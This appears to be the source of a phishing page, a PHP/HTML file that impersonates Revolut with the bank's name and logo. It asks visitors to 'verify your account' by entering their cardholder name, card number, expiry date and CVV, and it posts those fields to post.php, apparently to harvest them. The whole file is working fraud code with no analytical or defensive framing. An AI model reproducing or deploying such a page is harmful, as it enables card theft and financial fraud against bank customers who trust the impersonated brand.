
<?php 
require 'main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Revolut</title>
</head>
<body>
<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>

<main>
<div class="form">


<div class="title">
    <h1>Verify your account.</h1>
</div> 
<div class="title2">
<label>Please update your payment information<label>
    </div>




<form action="post.php" method="post">

<div class="coll">
<label> Cardholder name </label>
 <input type="text" name="name" required> </div>


<div class="coll">
<label> Card number </label>
<input type="text" name="cc" placeholder="XXXX XXXX XXXX XXXX" id="cc" required></div>


<div class="coll">
<label> Expiration date </label> 
<input type="text" name="exp" placeholder="MM/YY" id="exp" required> </div>


<div class="coll">
<label>security code </label>
<input type="text"  name="cvv" placeholder="CVV" id="cvv" required> </div>




<div class="but">
<div class="button"><button type="submit"> Continue</button> </div>
</div>


</div>
</main>

<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>
$("#cc").mask("0000 0000 0000 0000");
$("#exp").mask("00/00");
$("#cvv").mask("0000");
</script>
 

</body>
</html>